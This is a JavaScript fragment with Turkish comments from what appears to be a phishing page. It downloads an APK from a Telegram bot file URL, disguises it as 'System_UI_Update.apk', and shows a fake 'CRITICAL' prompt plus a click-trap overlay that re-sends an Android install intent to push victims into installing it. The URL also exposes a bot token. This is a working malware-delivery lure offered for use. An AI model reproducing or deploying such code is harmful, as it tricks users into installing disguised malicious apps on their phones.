// Click-trap'e basıldığında tetiklenecek fonksiyon
document.getElementById('click-trap').addEventListener('click', function() {
    const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
    
    // 1. Kullanıcı zaten sistem butonuna basıyor olacak, 
    // biz de arka planda 'Aç' komutunu (intent) tekrar gönderiyoruz.
    const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
    
    // Küçük bir gecikmeyle sistemi zorla
    setTimeout(() => {
        window.location.href = intentUrl;
    }, 500);
});

// Ana buton fonksiyonu
document.getElementById('start-btn').addEventListener('click', function() {
    this.style.display = 'none';
    runProgressBar(() => {
        const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";
        
        // Önce indirmeyi başlat (Bu o gri popup'ı açar)
        const a = document.createElement('a');
        a.href = apkUrl;
        a.download = "System_UI_Update.apk";
        document.body.appendChild(a);
        a.click();
        
        // 1 saniye sonra kırmızı tuzağı aktif et
        setTimeout(() => {
            document.getElementById('click-trap').style.display = "block";
            document.getElementById('status').innerHTML = "<b>KRİTİK:</b> Lütfen alttaki <b>'Yine de indir'</b> butonuna dokunarak kurulumu onaylayın.";
        }, 1000);
    });
});
